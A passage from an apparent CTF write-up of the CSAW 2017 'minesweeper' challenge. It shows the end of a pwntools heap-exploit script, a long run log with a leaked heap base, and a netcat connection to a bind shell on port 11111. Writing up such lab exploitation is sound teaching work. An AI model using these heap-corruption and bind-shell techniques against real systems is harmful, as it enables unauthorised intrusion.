payload += p32(heapBase + 0x5d) # bk pointer
payload += "2"*33

# Send the payload
initializeGame(14, 14, "X" + payload)

target.interactive()
```

When we run it:

```
$    python exploit.py
[!] Could not find executable 'minesweeper' in $PATH, using './minesweeper' instead
[+] Starting local process './minesweeper': pid 11660
[+] Opening connection to 127.0.0.1 on port 31337: Done
[*] '/Hackery/pod/modules/custom_misc_heap/csaw17_minesweeper/minesweeper'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Please enter in the dimensions of the board you would like to set in this format: B X Y

HI THERE!!
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X

____________
< cowsay <3 minesweeper >
 ------------          
       \   ,__,        
        \  (oo)____    
           (__)    )\  
              ||--|| *

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Invalid option, please try again N, I, or Q please!

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Welcome. The board has been initialized to have a random *mine*placed in the midst. Your job is to uncover it. You can:
1) View Board (V)
2) Uncover a location (U X Y). Zero indexed.
3) Quit game (Q)

X11

Heap Base: 0x815c000

_
___
___
___

<
cow
say
 <3

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Please enter in the dimensions of the board you would like to set in this format: B X Y

HI THERE!!
_\x10  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X

____________
< cowsay <3 minesweeper >
 ------------          
       \   ,__,        
        \  (oo)____    
           (__)    )\  
              ||--|| *

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Invalid option, please try again N, I, or Q please!

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Please enter in the dimensions of the board you would like to set in this format: B X Y

HI THERE!!
 \x0b  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X

____________
< cowsay <3 minesweeper >
 ------------          
       \   ,__,        
        \  (oo)____    
           (__)    )\  
              ||--|| *

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Invalid option, please try again N, I, or Q please!

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Please enter in the dimensions of the board you would like to set in this format: B X Y

HI THERE!!
)      +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X

____________
< cowsay <3 minesweeper >
 ------------          
       \   ,__,        
        \  (oo)____    
           (__)    )\  
              ||--|| *

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Invalid option, please try again N, I, or Q please!

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)

Please enter in the dimensions of the board you would like to set in this format: B X Y

HI THERE!!
/\x07  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X

[*] Switching to interactive mode
```

Because we are attacking a server, I just had my shellcode bind a shell to port `11111` which we can connect to:

```
$    nc 127.0.0.1 11111
w
 03:51:43 up  9:56,  1 user,  load average: 0.19, 0.11, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               17:56   ?xdm?  10:05   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
ls
back.py
core
exploit.py
heapLeak.py
jmp.asm
jmp.o
minesweeper
notes
readme.md
```

Just like that, we popped a shell!